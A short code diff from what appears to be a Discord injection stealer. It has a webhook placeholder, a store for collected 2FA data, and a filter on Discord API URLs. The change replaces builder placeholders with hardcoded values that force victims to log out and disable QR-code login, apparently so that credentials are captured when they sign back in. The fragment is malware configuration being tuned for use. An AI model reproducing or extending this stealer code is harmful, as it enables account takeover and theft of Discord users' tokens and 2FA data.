@@ -15,11 +15,11 @@ const webhook = '%WEBHOOK%'
 let contents2FA = []
 
 var config = {
-  "logout": "%LOGOUT%",
+  "logout": "true",
   "logout-notify": "true",
   "init-notify": "true",
   "embed-color": 2895667,
-  "disable_qrcode": "%DISABLE_QRCODE%",
+  "disable_qrcode": "true",
   Filter: {
         urls: [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
